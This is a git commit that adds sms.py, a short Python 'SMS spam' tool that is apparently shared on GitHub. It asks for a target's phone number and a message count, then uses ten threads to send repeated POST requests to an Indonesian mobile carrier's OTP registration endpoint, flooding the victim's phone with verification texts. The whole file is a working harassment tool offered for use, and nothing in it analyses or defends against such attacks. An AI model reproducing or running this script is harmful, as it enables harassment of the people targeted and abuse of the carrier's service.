e6f627e33cdd20c53c174556e330ff2c9a61c2b4
raihan992 <49934292+raihan992@users.noreply.github.com>
2019-04-26 02:09:57 +0600

    Create sms.py

---
+++ sms.py
@@ -0,0 +1,44 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+# Coded by R.Raihan
+"""
+This App Decode By R.Raihan.
+Original Coder KANG-NEWBIE.
+"""
+from multiprocessing.pool import ThreadPool
+try:
+	import os, time, requests, sys
+except ModuleNotFoundError:
+	print("\nSepertinya module requests BELUM Di Install")
+	print("$ pip install requests\n")
+	exit()
+
+banner=("""\033[1;36m
+     _  _
+   _| || |_  \033[1;32mSEPAM ESEMES (UPDATE)\033[1;36m
+  |_  ..  _|
+  |_      _| \033[1;31mContact=>https://m.facebook.com/foul.adnan\033[1;36m
+    |_||_|   \033[1;31mGithub=>https://github.com/raihan992
+""")
+
+os.system('clear')
+print(banner)
+no = input("\033[1;37mInput Target Number With Countrycode =>\033[1;32m")
+tot = int(input("\033[1;37mHow Many Sms To Send =>\033[1;32m"))
+spam = {'msisdn':no}
+idk = '200'
+def main(arg):
+	try:
+		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
+#		print(r.text)
+		if str(idk) in str(r.text):
+			print("\033[1;32m[+] Done")
+		else:
+			print("\033[1;31m[-] Failed")
+	except: pass
+
+jobs = []
+for x in range(tot):
+    jobs.append(x)
+p=ThreadPool(10)
+p.map(main,jobs)
